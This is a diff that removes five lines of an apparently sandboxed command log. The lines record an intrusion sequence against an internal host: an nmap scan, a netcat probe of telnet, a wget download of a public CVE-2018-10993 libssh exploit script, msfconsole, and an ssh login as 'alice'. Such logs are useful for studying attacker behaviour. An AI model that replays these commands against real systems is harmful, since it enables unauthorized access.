@@ -1,5 +1,0 @@
-{"sandbox_id": "400", "timestamp_str": "2019-08-14T15:39:04.858332Z", "cmd_type": "bash-command", "cmd": "nmap 172.18.1.5 -A"}
-{"sandbox_id": "400", "timestamp_str": "2019-08-14T15:41:45.027954Z", "cmd_type": "bash-command", "cmd": "nc 172.18.1.5 23"}
-{"sandbox_id": "400", "timestamp_str": "2019-08-14T15:43:54.065373Z", "cmd_type": "bash-command", "cmd": "wget https://gist.githubusercontent.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d/raw/d4425b8504d25cf364185257eff04c6a8cc9a06e/cve-2018-10993.py"}
-{"sandbox_id": "400", "timestamp_str": "2019-08-14T15:44:11.985956Z", "cmd_type": "bash-command", "cmd": "msfconsole "}
-{"sandbox_id": "400", "timestamp_str": "2019-08-14T15:49:07.810189Z", "cmd_type": "bash-command", "cmd": "ssh alice@172.18.1.5"}
